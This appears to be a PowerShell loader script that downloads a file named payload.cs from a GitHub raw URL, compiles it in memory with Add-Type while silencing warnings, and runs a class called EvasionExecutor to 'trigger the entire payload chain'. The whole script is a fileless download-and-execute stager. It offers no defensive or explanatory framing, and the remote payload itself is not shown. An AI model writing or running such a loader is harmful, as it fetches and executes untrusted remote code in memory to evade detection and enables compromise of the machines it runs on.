# 1. Download the raw C# source code from your GitHub into a variable.
$source = (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/lucid251/HGJFJTKH24/main/payload.cs')

# 2. Compile and load the C# code in memory.
#    -WarningAction 0 silences compiler warnings.
Add-Type -TypeDefinition $source -WarningAction 0

# 3. Create a new instance of our C# class.
$executor = New-Object EvasionExecutor

# 4. Call the Execute method to trigger the entire payload chain.
$executor.Execute()
